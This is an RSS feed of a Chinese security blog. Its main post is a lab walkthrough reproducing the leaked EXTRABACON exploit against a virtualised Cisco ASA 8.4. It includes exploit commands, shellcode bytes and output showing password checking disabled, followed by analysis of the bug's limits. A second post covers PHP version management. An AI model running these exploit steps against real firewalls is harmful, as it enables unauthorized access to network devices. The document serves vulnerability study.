<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    
    <title><![CDATA[Hc1m1]]></title>
    <link>http://0x48.pw//</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    <description><![CDATA[水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会]]></description>
    <pubDate>Thu, 01 Sep 2016 07:12:13 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title><![CDATA[Cisco ASA RCE 环境搭建]]></title>
      <link>http://0x48.pw/2016/08/31/0x21/</link>
      <guid>http://0x48.pw/2016/08/31/0x21/</guid>
      <pubDate>Wed, 31 Aug 2016 14:56:11 GMT</pubDate>
      <description>
      <![CDATA[<p>这几天在研究方程式泄露的EXTRABACON（EXBA）PoC, 网上没找到能成功的远程, 所以准备自己本地搭环境, 然后看到了这篇文章<a href="http://www.freebuf.com/vuls/112589.html">http://www.freebuf.com/vuls/112589.html</a> </p>]]>
      
      </description>
      <content:encoded><![CDATA[<p>这几天在研究方程式泄露的EXTRABACON（EXBA）PoC, 网上没找到能成功的远程, 所以准备自己本地搭环境, 然后看到了这篇文章<a href="http://www.freebuf.com/vuls/112589.html" target="_blank" rel="external">http://www.freebuf.com/vuls/112589.html</a> </p>
<a id="more"></a>
<p>这篇文章是在方程式信息泄露后看过的对我最有帮助的文章了, 不过尴尬的是, 文章中复现环境是Windows下使用VM， 可是我的环境却是Linux+VBox</p>
<p>表示我的Windows都是用来打游戏的, 啥工具都没有, 仔细看了下文章, 准备去搜搜Linux+VBox的解决方案</p>
<p>首先是虚拟机镜像文件这些东西: <a href="http://l.0x48.pw/blackhat/ASA-8.4.zip" target="_blank" rel="external">http://l.0x48.pw/blackhat/ASA-8.4.zip</a></p>
<p>解压出来， 里面有个<code>ASA-8.4.ovf</code>, 可直接用VBox的import applicace导入虚拟机</p>
<p>讲道理, 应该导入后就可以使用了, 但是没人跟你讲道理, 所以接下来要做两件事, 或者可以说是一件事 —— 配网络, 配网络就需要使用Serial口连进去.</p>
<h2 id="连接Serial口">连接Serial口</h2><p>如下图所示:<br><img src="http://qn.lazysheep.cc/img/cisco1.png" alt="cisco1"></p>
<p>基本默认就好, 重要的是<code>Path/Address: /tmp/gns3_vbox/5d5928d1-3cb9-46c6-85cb-b7e1121f188c</code></p>
<p>这个地址自己填一个, 要写到VBox可写目录, 所以选择了/tmp</p>
<p>然后在Ubuntu下连接Serial口的工具我选择了<code>minicom</code>:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo apt install minicom</span><br><span class="line"><span class="variable">$ </span>sudo vim /etc/minicom/minirc.dfl</span><br><span class="line">pu port			unix<span class="comment">#/tmp/gns3_vbox/5d5928d1-3cb9-46c6-85cb-b7e1121f188c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#后面跟的路径就是上面VBox的那个路径</span></span><br></pre></td></tr></table></figure></p>
<p>然后就是启动虚拟机了, 不过在启动之前还有几个问题</p>
<p>如图:<br><img src="http://qn.lazysheep.cc/img/cisco2.png" alt="cisco2"></p>
<p>更大的那块硬盘要作为Master, 要设置成启动盘, 虚拟机导入后是500kb的那块是启动盘, 所以启动不起来</p>
<p>然后是网络, 自己测试就开一块网卡就够了, 然后我使用only-host, 如图:<br><img src="http://qn.lazysheep.cc/img/cisco3.png" alt="cisco3"></p>
<p><img src="http://qn.lazysheep.cc/img/cisco4.png" alt="cisco4"></p>
<p>然后可以开机了</p>
<p>开机后选择<code>ASA 8.42</code> 启动, 然后会停在<code>Booting the kernel</code>, 然后别等了, 你等再久也是这页面(我最开始摸索的时候傻傻的等了半小时), 现在就可以使用<code>minicom</code>去连接ASA的Serial口了</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo minicom</span><br><span class="line"><span class="escape">``</span><span class="escape">` </span></span><br><span class="line"></span><br><span class="line">然后等会就能进入防火墙的终端了</span><br></pre></td></tr></table></figure>
<p>ciscoasa&gt;en<br>Password:<br>ciscoasa#show run<br>……<br>interface GigabitEthernet0<br> shutdown<br> no nameif<br> no security-level<br> no ip address<br>!<br>……<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查看配置会发现<span class="tag">VBox</span>的<span class="tag">host-only</span>配的<span class="tag">DHCP</span>对这防火墙并没有用, 所以只能配静态<span class="tag">ip</span>了</span><br><span class="line"></span><br><span class="line">因为上面<span class="tag">VBox</span> <span class="tag">host-only</span>的网卡我配的是`192<span class="class">.168</span><span class="class">.56</span><span class="class">.1</span>`, 所以防火墙我配个`192<span class="class">.168</span><span class="class">.56</span><span class="class">.150</span>`</span><br></pre></td></tr></table></figure></p>
<p>ciscoasa# conf ter<br>ciscoasa(config)# </p>
<p><strong><strong><strong><strong><strong><strong><strong>*</strong></strong></strong></strong></strong></strong></strong> NOTICE <strong><strong><strong><strong><strong><strong><strong>*</strong></strong></strong></strong></strong></strong></strong></p>
<p>Help to improve the ASA platform by enabling anonymous reporting,<br>which allows Cisco to securely receive minimal error and health<br>information from the device. To learn more about this feature,<br>please visit: <a href="http://www.cisco.com/go/smartcall" target="_blank" rel="external">http://www.cisco.com/go/smartcall</a></p>
<p>Would you like to enable anonymous error reporting to help improve<br>the product? [Y]es, [N]o, [A]sk later: y</p>
<p>Enabling anonymous reporting.<br>Adding “call-home reporting anonymous” to running configuration…<br>Creating trustpoint “_SmartCallHome_ServerCA” and installing certificate…</p>
<p>Trustpoint ‘_SmartCallHome_ServerCA’ is a subordinate CA and holds a non self-s.</p>
<p>Trustpoint CA certificate accepted.</p>
<p>Please remember to save your configuration.</p>
<p>ciscoasa(config)# int G0<br>ciscoasa(config-if)# ip address 192.168.56.150 255.255.255.0<br>ciscoasa(config-if)# nameif inside<br>ciscoasa(config-if)# no shut<br>ciscoasa(config-if)# exit<br>ciscoasa(config)# exit<br>ciscoasa# show run<br>……<br>interface GigabitEthernet0<br> nameif inside<br> security-level 100<br> ip address 192.168.56.150 255.255.255.0<br>……<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">配置<span class="literal">ip</span>成功, 然后试着ping</span><br></pre></td></tr></table></figure></p>
<p>ciscoasa# ping 192.168.56.1<br>Type escape sequence to abort.<br>Sending 5, 100-byte ICMP Echos to 192.168.56.1, timeout is 2 seconds:<br>?????<br>Success rate is 0 percent (0/5)<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">是GG的, 需要重启下</span><br></pre></td></tr></table></figure></p>
<p>ciscoasa# copy running-config startup-config</p>
<p>Source filename [running-config]?<br>Cryptochecksum: 7ab821ac df1697e5 257673c1 49832288 </p>
<p>5670 bytes copied in 0.20 secs<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后可以断电重启了(或者有没有像Linux上<span class="regexp">/etc/</span>init.d/networking restart的程序? 并不懂, 所以采取了简单明了的硬重启)</span><br><span class="line"></span><br><span class="line">然后ping本机查看网络是否通畅:</span><br></pre></td></tr></table></figure></p>
<p>ciscoasa&gt; ping 192.168.56.1<br>Type escape sequence to abort.<br>Sending 5, 100-byte ICMP Echos to 192.168.56.1, timeout is 2 seconds:<br>!!!!!<br>Success rate is 100 percent (5/5), round-trip min/avg/max = 1/1/1 ms<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">接下来就是开服务了, 根据漏洞描述, 防火墙需要开启ssh<span class="regexp">/telnet 和 snmp服务, 通过snmp的漏洞让ssh/</span>telnet不需要密码即可登陆, 默认情况下, 这些服务器都是关闭的, 需要我们手动开始</span><br></pre></td></tr></table></figure></p>
<h1 id="开启telnet服务,_允许任何主机访问">开启telnet服务, 允许任何主机访问</h1><p>ciscoasa(config)# telnet 0.0.0.0 0.0.0.0 inside</p>
<h1 id="开始snmp服务,_允许192-168-56-1主机访问">开始snmp服务, 允许192.168.56.1主机访问</h1><p>ciscoasa(config)# snmp-server host inside 192.168.56.1 community public<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">检查是否成功开启</span><br></pre></td></tr></table></figure></p>
<p>$ nmap 192.168.56.150 -p23 -Pn</p>
<p>Starting Nmap 7.01 ( <a href="https://nmap.org" target="_blank" rel="external">https://nmap.org</a> ) at 2016-09-01 14:34 CST<br>Nmap scan report for 192.168.56.150<br>Host is up (0.00024s latency).<br>PORT   STATE SERVICE<br>23/tcp open  telnet</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds</p>
<p>$ sudo nmap 192.168.56.150 -p161 -sU</p>
<p>Starting Nmap 7.01 ( <a href="https://nmap.org" target="_blank" rel="external">https://nmap.org</a> ) at 2016-09-01 14:36 CST<br>Nmap scan report for 192.168.56.150<br>Host is up (0.00020s latency).<br>PORT    STATE SERVICE<br>161/udp open  snmp<br>MAC Address: 08:00:27:89:2B:96 (Oracle VirtualBox virtual NIC)</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后可以使用方程式泄露的PoC打打看:</span><br></pre></td></tr></table></figure></p>
<p>$ python extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public<br>WARNING: No route found for IPv6 destination :: (no default route?)<br>Logging to /EXPLOITS/EXBA/concernedparent<br>[+] Executing:  extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public<br>[+] probing target via snmp<br>[+] Connecting to 192.168.56.150:161</p>
<hr>
<p>[+] response:</p>
<h3 id="[_SNMP_]">[ SNMP ]</h3><p>  version   = <asn1_integer[1l]><br>  community = <asn1_string['public']><br>  \PDU       \<br>   |###[ SNMPresponse ]###<br>   |  id        = <asn1_integer[0l]><br>   |  error     = <asn1_integer[0l]><br>   |  error_index= <asn1_integer[0l]><br>   |  \varbindlist\<br>   |   |###[ SNMPvarbind ]###<br>   |   |  oid       = <asn1_oid['.1.3.6.1.2.1.1.1.0']><br>   |   |  value     = <asn1_string['cisco adaptive="" security="" appliance="" version="" 8.4(2)']=""><br>   |   |###[ SNMPvarbind ]###<br>   |   |  oid       = <asn1_oid['.1.3.6.1.2.1.1.3.0']><br>   |   |  value     = <asn1_time_ticks[93000l]><br>   |   |###[ SNMPvarbind ]###<br>   |   |  oid       = <asn1_oid['.1.3.6.1.2.1.1.5.0']><br>   |   |  value     = <asn1_string['ciscoasa']></asn1_string['ciscoasa']></asn1_oid['.1.3.6.1.2.1.1.5.0']></asn1_time_ticks[93000l]></asn1_oid['.1.3.6.1.2.1.1.3.0']></asn1_string['cisco></asn1_oid['.1.3.6.1.2.1.1.1.0']></asn1_integer[0l]></asn1_integer[0l]></asn1_integer[0l]></asn1_string['public']></asn1_integer[1l]></p>
<p>[+] firewall uptime is 93000 time ticks, or 0:15:30</p>
<p>[+] firewall name is ciscoasa</p>
<p>[+] target is running asa842, which is supported<br>Data stored in key file  : asa842<br>Data stored in self.vinfo: ASA842</p>
<p>To check the key file to see if it really contains what we’re claiming:</p>
<h1 id="cat_/EXPLOITS/EXBA/keys/dc9d0q-key">cat /EXPLOITS/EXBA/keys/dc9d0q.key</h1><p>To disable password checking on target:</p>
<h1 id="extrabacon_1-1-0-1-py_exec_-k_dc9d0q_-t_192-168-56-150_-c_public_—mode_pass-disable">extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public —mode pass-disable</h1><p>To enable password checking on target:</p>
<h1 id="extrabacon_1-1-0-1-py_exec_-k_dc9d0q_-t_192-168-56-150_-c_public_—mode_pass-enable">extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public —mode pass-enable</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第一步是主机信息探测, 接下来就是攻击了, 他的作用是可以无需密码使用telnet/ssh 连接防火墙:</span><br></pre></td></tr></table></figure>
<p>$ telnet 192.168.56.150<br>Trying 192.168.56.150…<br>Connected to 192.168.56.150.<br>Escape character is ‘^]’.</p>
<p>User Access Verification</p>
<p>Password:<br>Password:<br>Password: Connection closed by foreign host.<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先看没攻击前, 是没法连上的</span><br></pre></td></tr></table></figure></p>
<p>$ python  extrabacon<em>1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public —mode pass-disable<br>WARNING: No route found for IPv6 destination :: (no default route?)<br>Logging to /EXPLOITS/EXBA/concernedparent<br>[+] Executing:  extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public —mode pass-disable<br>Data stored in self.vinfo: ASA842<br>[+] generating exploit for exec mode pass-disable<br>[+] using shellcode in ./versions<br>[+] importing version-specific shellcode shellcode_asa842<br>[+] building payload for mode pass-disable<br>appended PMCHECK_DISABLE payload bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3<br>appended AAAADMINAUTH_DISABLE payload bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3<br>[+] random SNMP request-id 527684062<br>[+] fixing offset to payload 50<br>overflow (112): 1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9.95.184.67.123.122.173.53.165.165.165.165.131.236.4.137.4.36.137.229.131.197.72.49.192.49.219.179.16.49.246.191.174.170.170.170.129.247.165.165.165.165.96.139.132.36.224.1.0.0.4.50.255.208.97.195.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.25.71.20.9.139.124.36.20.139.7.255.224.144<br>payload (133): bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3c3<br>EXBA msg (370): 3082016e02010104067075626c6963a582015f02041f73d1de0201000201013082014f30819106072b060102010101048185bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3c33081b80681b32b060104010909836b010303010105095f8138437b7a812d3581258125812581258103816c048109042481098165810381454831814031815b813310318176813f812e812a812a812a81018177812581258125812560810b81042481600100000432817f8150618143811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811019471409810b7c2414810b07817f816081100500<br>[+] Connecting to 192.168.56.150:161<br>[+] packet 1 of 1<br>[+] 0000   30 82 01 6E 02 01 01 04  06 70 75 62 6C 69 63 A5   0..n…..public.<br>[+] 0010   82 01 5F 02 04 1F 73 D1  DE 02 01 00 02 01 01 30   ..</em>…s……..0<br>[+] 0020   82 01 4F 30 81 91 06 07  2B 06 01 02 01 01 01 04   ..O0….+…….<br>[+] 0030   81 85 BF A5 A5 A5 A5 B8  D8 A5 A5 A5 31 F8 BB A5   …………1…<br>[+] 0040   25 F6 AC 31 FB B9 A5 B5  A5 A5 31 F9 BA A2 A5 A5   %..1……1…..<br>[+] 0050   A5 31 FA CD 80 EB 14 BF  F0 8F 53 09 31 C9 B1 04   .1……..S.1…<br>[+] 0060   FC F3 A4 E9 0C 00 00 00  5E EB EC E8 F8 FF FF FF   ……..^…….<br>[+] 0070   31 C0 40 C3 BF A5 A5 A5  A5 B8 D8 A5 A5 A5 31 F8   1.@………..1.<br>[+] 0080   BB A5 B5 AD AD 31 FB B9  A5 B5 A5 A5 31 F9 BA A2   …..1……1…<br>[+] 0090   A5 A5 A5 31 FA CD 80 EB  14 BF E0 13 08 08 31 C9   …1……….1.<br>[+] 00a0   B1 04 FC F3 A4 E9 0C 00  00 00 5E EB EC E8 F8 FF   ……….^…..<br>[+] 00b0   FF FF 31 C0 40 C3 C3 30  81 B8 06 81 B3 2B 06 01   ..1.@..0…..+..<br>[+] 00c0   04 01 09 09 83 6B 01 03  03 01 01 05 09 5F 81 38   …..k……._.8<br>[+] 00d0   43 7B 7A 81 2D 35 81 25  81 25 81 25 81 25 81 03   C{z.-5.%.%.%.%..<br>[+] 00e0   81 6C 04 81 09 04 24 81  09 81 65 81 03 81 45 48   .l….$…e…EH<br>[+] 00f0   31 81 40 31 81 5B 81 33  10 31 81 76 81 3F 81 2E   1.@1.[.3.1.v.?..<br>[+] 0100   81 2A 81 2A 81 2A 81 01  81 77 81 25 81 25 81 25   .<em>.</em>.*…w.%.%.%<br>[+] 0110   81 25 60 81 0B 81 04 24  81 60 01 00 00 04 32 81   .%<code>....$.</code>….2.<br>[+] 0120   7F 81 50 61 81 43 81 10  81 10 81 10 81 10 81 10   ..Pa.C……….<br>[+] 0130   81 10 81 10 81 10 81 10  81 10 81 10 81 10 81 10   …………….<br>[+] 0140   81 10 81 10 81 10 81 10  81 10 81 10 81 10 81 10   …………….<br>[+] 0150   81 10 81 10 81 10 81 10  81 10 81 10 81 10 19 47   ……………G<br>[+] 0160   14 09 81 0B 7C 24 14 81  0B 07 81 7F 81 60 81 10   ….|$…….`..<br>[+] 0170   05 00                                              ..</p>
<hr>
<p>[+] response:</p>
<h3 id="[_SNMP_]-1">[ SNMP ]</h3><p>  version   = <asn1_integer[1l]><br>  community = <asn1_string['public']><br>  \PDU       \<br>   |###[ SNMPresponse ]###<br>   |  id        = <asn1_integer[527684062l]><br>   |  error     = <asn1_integer[0l]><br>   |  error_index= <asn1_integer[0l]><br>   |  \varbindlist\<br>   |   |###[ SNMPvarbind ]###<br>   |   |  oid       = <asn1_oid['.1.3.6.1.2.1.1.1.0']><br>   |   |  value     = <asn1_string['cisco adaptive="" security="" appliance="" version="" 8.4(2)']=""><br>   |   |###[ SNMPvarbind ]###<br>   |   |  oid       = <asn1_oid['.1.3.6.1.4.1.99.12.36.1.1.1.116.114.97.112.104.111.115.116.46.112.117.98.108.105.99.46.49.57.50.46.49.54.56.46.53.54.46.49.46.50']><br>   |   |  value     = <asn1_string['']><br>[+] received SNMP id 527684062, matches random id sent, likely success<br>[+] clean return detected<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后使用telnet登陆看看</span><br></pre></td></tr></table></figure></asn1_string['']></asn1_oid['.1.3.6.1.4.1.99.12.36.1.1.1.116.114.97.112.104.111.115.116.46.112.117.98.108.105.99.46.49.57.50.46.49.54.56.46.53.54.46.49.46.50']></asn1_string['cisco></asn1_oid['.1.3.6.1.2.1.1.1.0']></asn1_integer[0l]></asn1_integer[0l]></asn1_integer[527684062l]></asn1_string['public']></asn1_integer[1l]></p>
<p>$ telnet 192.168.56.150<br>Trying 192.168.56.150…<br>Connected to 192.168.56.150.<br>Escape character is ‘^]’.</p>
<p>User Access Verification</p>
<p>Password:<br>Type help or ‘?’ for a list of available commands.<br>ciscoasa&gt; en<br>Password:<br>ciscoasa# conf ter<br>ciscoasa(config)#<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">攻击成功</span><br><span class="line"></span><br><span class="line">从上面环境搭建的过程我们来简单的分析下这漏洞的情况</span><br><span class="line"></span><br><span class="line"><span class="bullet">1. </span>必须开启snmp服务和ssh/telnet, 而防火墙默认是关闭的</span><br><span class="line"><span class="bullet">2. </span>snmp服务开启是使用白名单, 而且只能指定单个ip而不能指定整个网段</span><br></pre></td></tr></table></figure></p>
<p>ciscoasa(config)# snmp-server host inside 0.0.0.0 community public<br>ERROR: Not a valid host address - 0.0.0.0<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>ciscoasa(config)# snmp-server host inside 192.168.56.0 community public<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>$ sudo nmap 192.168.56.150 -p161 -sU</p>
<p>Starting Nmap 7.01 ( <a href="https://nmap.org" target="_blank" rel="external">https://nmap.org</a> ) at 2016-09-01 15:07 CST<br>Nmap scan report for 192.168.56.150<br>Host is up (0.00018s latency).<br>PORT    STATE         SERVICE<br>161/udp open|filtered snmp<br>MAC Address: 08:00:27:89:2B:96 (Oracle VirtualBox virtual NIC)</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>ciscoasa(config)# snmp-server host inside 192.168.56.0 255.255.255.0 community$</p>
<p>snmp-server host inside 192.168.56.0 255.255.255.0 community public<br>                                     ^<br>ERROR: % Invalid input detected at ‘^’ marker.<br>ciscoasa(config)# snmp-server host inside 192.168.56.0/24 community public<br>                                                      ^<br>ERROR: % Invalid input detected at ‘^’ marker.<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以看出, 因为不允许设置子网掩码, 所以根本没法输入网络地址, 只能输入单个<span class="literal">ip</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. snmp的community认证问题, <span class="preprocessor">public</span>为我们设置的认证字符串, 比如我们改一改</span><br></pre></td></tr></table></figure></p>
<p>ciscoasa(config)# snmp-server host inside 192.168.56.1 community public-test<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>$ python extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public<br>WARNING: No route found for IPv6 destination :: (no default route?)<br>Logging to /EXPLOITS/EXBA/concernedparent<br>[+] Executing:  extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public<br>[+] probing target via snmp<br>[+] Connecting to 192.168.56.150:161</p>
<hr>
<p>Traceback (most recent call last):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>$ python extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public-test<br>WARNING: No route found for IPv6 destination :: (no default route?)<br>Logging to /EXPLOITS/EXBA/concernedparent<br>[+] Executing:  extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public-test<br>[+] probing target via snmp<br>[+] Connecting to 192.168.56.150:161</p>
<hr>
<p>[+] response:</p>
<h3 id="[_SNMP_]-2">[ SNMP ]</h3><p>  version   = <asn1_integer[1l]><br>  community = <asn1_string['public-test']><br>  \PDU       \<br>   |###[ SNMPresponse ]###<br>   |  id        = <asn1_integer[0l]><br>   |  error     = <asn1_integer[0l]><br>   |  error_index= <asn1_integer[0l]><br>   |  \varbindlist\<br>   |   |###[ SNMPvarbind ]###<br>   |   |  oid       = <asn1_oid['.1.3.6.1.2.1.1.1.0']><br>   |   |  value     = <asn1_string['cisco adaptive="" security="" appliance="" version="" 8.4(2)']=""><br>   |   |###[ SNMPvarbind ]###<br>   |   |  oid       = <asn1_oid['.1.3.6.1.2.1.1.3.0']><br>   |   |  value     = <asn1_time_ticks[150100l]><br>   |   |###[ SNMPvarbind ]###<br>   |   |  oid       = <asn1_oid['.1.3.6.1.2.1.1.5.0']><br>   |   |  value     = <asn1_string['ciscoasa']></asn1_string['ciscoasa']></asn1_oid['.1.3.6.1.2.1.1.5.0']></asn1_time_ticks[150100l]></asn1_oid['.1.3.6.1.2.1.1.3.0']></asn1_string['cisco></asn1_oid['.1.3.6.1.2.1.1.1.0']></asn1_integer[0l]></asn1_integer[0l]></asn1_integer[0l]></asn1_string['public-test']></asn1_integer[1l]></p>
<p>[+] firewall uptime is 150100 time ticks, or 0:25:01</p>
<p>[+] firewall name is ciscoasa</p>
<p>[+] target is running asa842, which is supported<br>Data stored in key file  : asa842<br>Data stored in self.vinfo: ASA842</p>
<p>To check the key file to see if it really contains what we’re claiming:</p>
<h1 id="cat_/EXPLOITS/EXBA/keys/OpezI1-key">cat /EXPLOITS/EXBA/keys/OpezI1.key</h1><p>To disable password checking on target:</p>
<h1 id="extrabacon_1-1-0-1-py_exec_-k_OpezI1_-t_192-168-56-150_-c_public-test_—mode_pass-disable">extrabacon_1.1.0.1.py exec -k OpezI1 -t 192.168.56.150 -c public-test —mode pass-disable</h1><p>To enable password checking on target:<br>```</p>
<p>在密码不对的情况下snmp根本连不上</p>
<p>上述三种条件, 导致了该漏洞是非常鸡肋的RCE, 首先你需要能访问SNMP, 访问SNMP需要你在防火墙的白名单中, 然后还要知道Community认证的密码.</p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/08/31/0x21/#disqus_comments</comments>
    </item>
    
    <item>
      <title><![CDATA[LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP]]></title>
      <link>http://0x48.pw/2016/08/16/0x20/</link>
      <guid>http://0x48.pw/2016/08/16/0x20/</guid>
      <pubDate>Tue, 16 Aug 2016 15:31:44 GMT</pubDate>
      <description>
      <![CDATA[<p>LNMP: <a href="https://lnmp.org/">https://lnmp.org/</a><br>phpenv-installer: <a href="https://github.com/rogeriopradoj/phpenv-installer">https://github.com/rogeriopradoj/phpenv-installer</a></p>]]>
      
      </description>
      <content:encoded><![CDATA[<p>LNMP: <a href="https://lnmp.org/" target="_blank" rel="external">https://lnmp.org/</a><br>phpenv-installer: <a href="https://github.com/rogeriopradoj/phpenv-installer" target="_blank" rel="external">https://github.com/rogeriopradoj/phpenv-installer</a></p>
<a id="more"></a>
<p>LNMP是Linux平台下一键安装Mysql + PHP + Nginx服务的一键安装包，傻瓜式安装环境，没啥好说的。</p>
<p>然后是使用phpenv-installer去安装phpenv</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>curl -<span class="constant">L </span><span class="symbol">http:</span>/<span class="regexp">/git.io/phpenv</span>-installer | bash</span><br></pre></td></tr></table></figure>
<p>然后把写下这段写入<code>~/.bashrc</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PHPENV_ROOT=<span class="string">"/root/.phpenv"</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="operator">-d</span> <span class="string">"<span class="variable">$&#123;PHPENV_ROOT&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$&#123;PHPENV_ROOT&#125;</span>/bin:<span class="variable">$&#123;PATH&#125;</span>"</span></span><br><span class="line">  <span class="built_in">eval</span> <span class="string">"<span class="variable">$(phpenv init -)</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p>
<p>然后<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>source .bashrc</span><br><span class="line"><span class="variable">$ </span>phpenv update</span><br><span class="line"><span class="variable">$ </span>phpenv install -l  <span class="comment">#可以查看可安装的php版本</span></span><br><span class="line"><span class="variable">$ </span>phpenv install <span class="number">5.6</span>.<span class="number">0</span>  <span class="comment"># 使用phpenv install 版本号   安装相应版本的php</span></span><br></pre></td></tr></table></figure></p>
<p>因为是测试环境, 我使用的都是root用户, phpenv是安装在<code>/root/.phpenv</code></p>
